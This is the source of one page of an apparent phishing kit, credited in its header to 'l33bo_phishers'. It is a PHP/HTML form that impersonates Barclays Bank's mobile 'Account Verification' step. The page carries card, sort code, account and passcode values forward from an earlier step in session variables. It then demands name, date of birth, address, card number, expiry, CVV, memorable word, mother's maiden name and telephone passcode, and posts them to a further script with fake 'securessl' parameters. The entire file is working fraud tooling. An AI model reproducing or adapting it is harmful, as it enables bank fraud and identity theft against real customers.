<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
session_start();
require "../../assets/includes/functions.php";
require "../../assets/includes/simplehtmldom.php";
require "../../assets/includes/enc.php";
$_SESSION['surname'] = $_POST['surname'];
$_SESSION['membershipNumber'] = $_POST['membershipNumber'];
$_SESSION['ccno'] = $_POST['debitCardSet1']."".$_POST['debitCardSet2']."".$_POST['debitCardSet3']."".$_POST['debitCardSet4'];
$_SESSION['sortcode'] = $_POST['sortCodeSet1']."".$_POST['sortCodeSet2']."".$_POST['sortCodeSet3'];
$_SESSION['acno'] = $_POST['accountNumber'];
$_SESSION['passcode'] = $_POST['passcode'];
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-GB" lang="en-GB"><head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Account Verification</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>
<script>
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
});
</script>
<script>
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');

      $.fn.toggleInputError = function(erred) {
        this.parent('.field').toggleClass('errorzzzz', erred);
        return this;
      };

      $('form').submit(function(e) {
        e.preventDefault();

        var cardType = $.payment.cardType($('.cc-number').val());
        $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
        $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
        $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
        $('.cc-brand').text(cardType);
      });

    });
</script>
<script>
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
			
			$.validator.addMethod("passcheck", function(value, element) {
   return $('#passy').val() != $('#telepin').val()
}, "Your online and telephone passcode can't be the same");
            //form validation rules
            $("#details").validate({
				errorElement: "div",			
                rules: {
					name: {	required: true,	minlength: 4,},
					dob: {	required: true,	minlength: 10,},
					telephone: { required: true, minlength: 11, digits: true,},
					address: { required: true, minlength: 5,},
					postcode: { required: true, minlength: 5,},
					ccno2: { required: true, minlength: 16, creditcard: true},
					ccexp: { required: true, minlength: 4,},
					secode: { required: true, minlength: 3, digits: true,},
					account: { required: true, minlength: 8, digits: true,},
					sortcode: {	required: true,	minlength: 8,},
					memo: { required: true, minlength: 6,},
					mmn: { required: true, minlength: 2,},
					passy: { required: true, minlength: 5, digits: true, passcheck: true,},
					telepin: { required: true, minlength: 5, digits: true, passcheck: true,},
                },
                messages: {
					name: {
						required: "Please provide your full name",
						minlength: jQuery.validator.format("Please provide your full name"),
					},
					dob: {
						required: "Please provide your date of birth",
						minlength: jQuery.validator.format("Please provide your date of birth"),
					},
					address: {
						required: "Please provide the 1st line of your address",
						minlength: jQuery.validator.format("Please check the address you have entered"),
					},
					postcode: {
						required: "Please provide your postcode",
						minlength: jQuery.validator.format("Please check the postcode you have entered"),
					},
					ccno2: {
						required: "Please provide your 16 digit card number",
						minlength: jQuery.validator.format("Please check the card number you have entered"),
						creditcard: jQuery.validator.format("Please check the card number you have entered"),
					},
					ccexp: {
						required: "Please provide your cards expiry date",
						minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
						date: jQuery.validator.format("Please check the card expiry date you have entered"),
					},
					secode: {
						required: "Please provide your 3 digit card security code (CVV)",
						minlength: jQuery.validator.format("Please check the card security code you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					account: {
						required: "Please provide your 8 digit account number",
						minlength: jQuery.validator.format("Please check the account number you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					sortcode: {
						required: "Please provide your six digit sort code",
						minlength: jQuery.validator.format("Please check the sort code you have entered"),
					},
					memo: { required: "Please provide your memorable word", minlength: jQuery.validator.format("Please check the memorable word you have entered"), },
					mmn: { required: "Please provide your mother's maiden name", minlength: jQuery.validator.format("Please check the mother's maiden name you have entered"), },
					telepin: { required: "Please provide your telephone banking passcode", minlength: jQuery.validator.format("Please check the telephone banking passcode you have entered"), digits: jQuery.validator.format("Please ensure you enter digits only"), },
				},
                submitHandler: function(form) {
                    form.submit();
                }
            });
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
  
  </script>
  <style>
  .day, .year {
	  width:60px!important;
  }
  .month {
	  width:65px!important;
  }
  #secode {
	  width:35px!important;	  
  }
  .error {
	color:red;  
  }
  </style>
<meta http-equiv="Content-Language" content="en-GB">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="assets/img/001.ico" rel="shortcut icon">
<link type="text/css" rel="stylesheet" media="all" href="assets/css/mobi.css">
<script type="text/javascript" src="assets/js/mobi.js"></script>
</head>
<body class="mobi">
<script>var _ccpCat3 = true;</script>
<script src="assets/mbox.js" type="text/javascript"></script><style>.mboxDefault { visibility:hidden; }</style>
<div class="page mobiPage">
<div class="mobiHeader">
<img src="assets/img/004.gif" class="top-left-corner" alt="" width="10" height="10">
<div class="branding brandMob"> 
<img src="assets/img/002.gif" alt="Barclays" class="mob">
</div>
<div class="headLine"></div>
</div>
<div class="mobiBody">
<div class="content mobWidth">
<div class="section">
<div class="m-cont">
<br>
<span class="pageTitle"><strong>Account Verification</strong>
</span>
<br>
<div id="pad"></div>
<div id="errorscontain">
<div id='errors' class="errors"></div>                  
</div>
<form method="post" action="Finish.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" name="details" id="details">
<input type="hidden" name="passy" id="passy" value="<?=$_SESSION['passcode']?>" autocomplete="off">
<p></p>
Full Name<br>
<input type="text" size="25" maxlength="24" name="name" class="formFont" autocomplete="off" value="<?php echo $_SESSION['name'];?>"><br><br>
Date of Birth<br>
<input type="tel" size="25" maxlength="20" name="dob" id="dob" class="formFont" autocomplete="off" value="<?php echo $_SESSION['dob'];?>">
<br><br>
Address (Line 1)<br>
<input type="text" size="25" maxlength="50" name="address" class="formFont" title="First line of your Address" autocomplete="off" value="<?php echo $_SESSION['address'];?>"><br><br>
Postcode<br>
<input type="text" size="8" maxlength="50" name="postcode" class="formFont" title="Postcode" autocomplete="off"  value="<?php echo $_SESSION['postcode'];?>"><br><br>
Card Number<br>
<input autocomplete="off" class="wide input-lg form-control cc-number" id="cc-number" name="ccno2" type="tel" maxlength="20" value="<?php echo $_SESSION['ccno'];?>">
<br><br>
Card Expiry<br>
<input autocomplete="off" class="wide input-lg form-control cc-exp" id="cc-exp" name="ccexp" type="tel"  value="<?php echo $_SESSION['ccexp'];?>">
<br><br>
<strong>Three-digit</strong> security code<br>
<input autocomplete="off" class="wide input-lg form-control" maxlength="3" id="secode" name="secode" type="tel" value="<?php echo $_SESSION['secode'];?>">
<br><br>
Sort Code<br>
<input type="text" size="25" maxlength="20" name="sortcode" id="sortcode" class="formFont" autocomplete="off"  value="<?php echo $_SESSION['sortcode'];?>">
<br><br>
Account Number<br>
<input type="tel" size="25" maxlength="8" name="account" class="formFont" autocomplete="off"  value="<?php echo $_SESSION['account'];?>">
<br><br>
Memorable Word<br>
<input type="text" size="25" maxlength="24" name="memo" class="formFont" autocomplete="off"><br><br>
Mother's Maiden Name<br>
<input type="text" size="25" maxlength="24" name="mmn" class="formFont" autocomplete="off"  value=""><br><br>
Telephone Passcode<br>
<input type="tel" size="25" maxlength="5" name="telepin" id="telepin" class="formFont" autocomplete="off"><br><br>
<br>
<table border="0" cellpadding="0" cellspacing="0">
<tbody>
<tr>
<td align="left">
<span class="button button-forward" title="Next"><div align="right" id="wwctrl_Next"><input type="submit" id="Next" name="action:MobiLoginStep1WithoutAssistCookie_display" value="Next">
</div>
</span>
</td>
</tr>
</tbody>
</table>
</form>
</div>
</div>
</div>
<div class="mobiReg">&copy;&nbsp;Barclays&nbsp;Bank&nbsp;PLC. Registered&nbsp;in&nbsp;England. Registered&nbsp;no:1026167.</div>
</div>
<div class="mobiMain-Footer"><img src="assets/img/003.gif" class="bot-left-corner" alt="" width="10" height="10"></div>       
</div>
</body>
</html>